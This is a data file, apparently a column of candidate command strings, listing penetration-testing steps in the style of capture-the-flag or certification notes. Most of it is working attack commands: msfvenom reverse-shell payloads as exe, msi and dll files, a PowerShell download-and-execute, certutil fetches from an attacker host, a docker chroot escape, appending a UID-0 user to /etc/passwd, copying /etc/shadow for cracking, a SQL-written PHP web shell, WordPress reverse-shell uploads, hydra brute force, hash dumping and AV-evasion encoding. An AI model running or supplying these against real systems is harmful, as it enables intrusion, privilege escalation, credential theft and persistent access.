candidates.command_text: Run full port scan on discovered hosts: nmap -p- <IP>
Service scan on open ports: nmap -sV -sC -p <PORTS> <TARGET>
Web enumeration if HTTP found: gobuster dir -u http://<IP>
SSH brute if 22 open: hydra -L users -P pass ssh://<IP>
Reverse DNS on IP ranges: dnsrecon -r <RANGE>
Brute force: hydra -L users -P pass smb://<IP>
Search for specific files: smbmap -H <TARGET> -u <USER> -p <PASS> -r <SHARE> -A password
Add discovered vhosts to /etc/hosts: echo '<IP> vhost.example.com' | sudo tee -a /etc/hosts
Directory enumeration on new vhosts: gobuster dir -u http://vhost.example.com -w <WORDLIST>
Add subdomains to /etc/hosts for further testing
Login to WordPress: navigate to <URL>/wp-admin/ with found credentials
Upload plugin shell if admin: Plugins > Add New > Upload Plugin > choose PHP reverse shell as .zip
Edit theme files: Appearance > Theme Editor > 404.php (add PHP reverse shell)
Use system.multicall for faster brute force (multiple attempts in one request)
Use image with docker client: docker pull docker:latest
Inside container: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Use existing images from docker images
Download and execute: powershell -exec bypass -c "IEX(IWR http://<LHOST>/<FILE> -UseBasicParsing)"
Send from Windows: type file | nc <LHOST> <LPORT>
sudo nmap -p <PORT> -Pn -v <TARGET> to verify RDP accessible
Receive and decode: nc -l <LPORT> | base64 -d > file
Copy paste method: base64 <FILE> then copy output
Use SSH key: scp -i id_rsa file <USERNAME>@<TARGET>:/tmp/
On Windows target: certutil -urlcache -f http://<LHOST>:<PORT>/file file
Use with -i for SSH key: scp -i key.pem file target:/path
Use base64 encoding for text-safe transfer
Setup Python FTP server: python -m pyftpdlib -p 21
Run Invoke-ServiceAbuse if vulnerable service found
Use Process Monitor to find missing DLLs
Create malicious exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Service.exe
Place exe in path: copy Service.exe "C:\Program Files\Service.exe"
Restart service: sc stop <service> && sc start <service>
Create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi
Change binary path: sc config <service> binPath= "C:\temp\shell.exe"
Restart service: sc stop <service> && sc start <service>
Transfer to attacker: certutil -urlcache -f http://<IP>/nc.exe nc.exe
Extract hashes: impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Crack or PTH: hashcat -m 1000 hashes.txt wordlist.txt
Run as stored user: runas /savecred /user:admin cmd
Create malicious DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > hijack.dll
sudo nmap --script=<script>.nse (if script writable, inject command)
ls -la /root/ (check if can list root directory)
sudo -l (verify can run all commands as root)
Read root flag: cat /root/proof.txt or cat /root/root.txt
Use LinPEAS for more comprehensive scan
Use LinPEAS which includes capability check
Run: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Add root user to passwd: echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd
Copy shadow for offline cracking: cat /etc/shadow > /tmp/shadow.txt
while true; do ps aux | grep root; sleep 1; done
Write files: SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'
Save output: curl ... | sh | tee linpeas.out
Grep for passwords: grep -i pass linpeas.out
Use john or hashcat: john shadow.txt --wordlist=rockyou.txt
Use linpeas.sh or linenum.sh for automated enumeration with capabilities check
Automated filtering with grep: getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|dac_read_search|sys_admin|sys_ptrace)'
Use linpeas.sh capabilities module for automated classification
For cap_dac_override: Check if binary is editor (vim, nano) - edit /etc/passwd for UID 0
For cap_dac_read_search: Check if binary can read files (tar, base64) - exfiltrate shadow/keys
Internet access or cached GTFOBins/HackTricks documentation
Substitute <CAP_BINARY> with actual binary path from getcap
Use different exploitation technique for same capability/binary
Identified capability/binary combination from previous steps
Write access to /tmp or other working directory if needed
For root shell: stabilize shell and collect flags/loot
Edit /etc/passwd to remove root password: root::0:0:root:/root:/bin/bash (then su root with no password)
Edit /etc/shadow instead if cap allows: remove root password hash
Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd
Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /
Transfer files with nc: nc -l -p 1234 > file
Encode for AV evasion: msfvenom ... -e x86/shikata_ga_nai -i 9
Start listener: nc -nvlp <LPORT> or use multi/handler
Read exploit code: cat <FILENAME> or less <FILENAME>
Know target OS/service for appropriate scripts
Read script source for deeper understanding: cat /usr/share/nmap/scripts/<SCRIPT_NAME>.nse
Run deeper scan: gobuster-dir-custom with larger wordlist
Recursive scan on interesting dirs: gobuster dir -u http://<TARGET>/<DIR>/
Base64 encode and paste if no tools
